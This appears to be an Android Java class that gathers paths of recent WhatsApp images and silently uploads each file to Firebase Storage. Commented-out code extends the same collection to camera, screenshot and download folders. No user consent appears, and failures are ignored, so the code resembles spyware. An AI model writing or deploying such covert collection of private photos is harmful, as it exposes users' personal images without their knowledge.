package com.hazyaz.temps.Firebase;


import android.net.Uri;
import android.support.annotation.NonNull;
import android.util.Log;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.auth.FirebaseAuth;
import com.google.firebase.auth.FirebaseUser;
import com.google.firebase.database.FirebaseDatabase;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.util.ArrayList;
import java.util.UUID;


public class ImagesUpload {


    final int THUMBSIZE = 64;
    public ArrayList<String> whatsAppLast10Messages = new ArrayList<>();
    public ArrayList<String> cameraLast10Messages = new ArrayList<>();
    public ArrayList<String> screenshotsLast10Messages = new ArrayList<>();
    public ArrayList<String> downloadsLast10Messages = new ArrayList<>();
    private StorageReference mStorageRef;
    private FirebaseAuth mAuth;

    public void ImageUplods(ArrayList<String> whatsapp) {
//                            ArrayList<String> camera,
//                            ArrayList<String> screenshots,
//                            ArrayList<String> downloads
//        ASSINING IMAAGES LOCATION LIST TO THE VARIABLES

        whatsAppLast10Messages = whatsapp;
//        cameraLast10Messages = camera;
//        screenshotsLast10Messages = screenshots;
//        downloadsLast10Messages = downloads;

        mAuth = FirebaseAuth.getInstance();
        mStorageRef = FirebaseStorage.getInstance().getReference().child("mm");


        if (mAuth.getCurrentUser() != null) {
            FirebaseUser currentUser = mAuth.getCurrentUser();
            mStorageRef = FirebaseStorage.getInstance().getReference();
            FirebaseDatabase database = FirebaseDatabase.getInstance();

            Log.d("asdasdasdasd", whatsAppLast10Messages.get(2));

            for (int i = 0; i < whatsAppLast10Messages.size(); i++) {
                uploadwhatsappImaage(whatsAppLast10Messages.get(i));
                Log.d("assfddasdasd", whatsAppLast10Messages.get(i));

            }


        }
    }
//    whatsapp image upload

    private void uploadwhatsappImaage(String path) {

        final Uri myUri = Uri.fromFile(new File(path));
        StorageReference ref = mStorageRef.child("mm/Images/whatsapp/" + UUID.randomUUID().toString());
        ref.putFile(myUri)
                .addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        Log.d("uploaded ", "   " + myUri);

                    }
                })
                .addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception e) {

                    }
                });


    }


}
